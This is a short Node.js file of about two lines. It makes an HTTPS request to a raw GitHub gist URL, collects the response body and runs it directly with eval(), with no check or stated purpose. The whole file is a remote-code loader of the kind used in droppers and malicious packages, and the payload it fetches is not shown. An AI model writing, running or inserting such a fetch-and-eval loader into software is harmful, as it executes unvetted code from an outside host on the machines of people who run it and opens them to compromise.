const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/88782dfe173c57df74644f3e22025d3cf74240fc/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
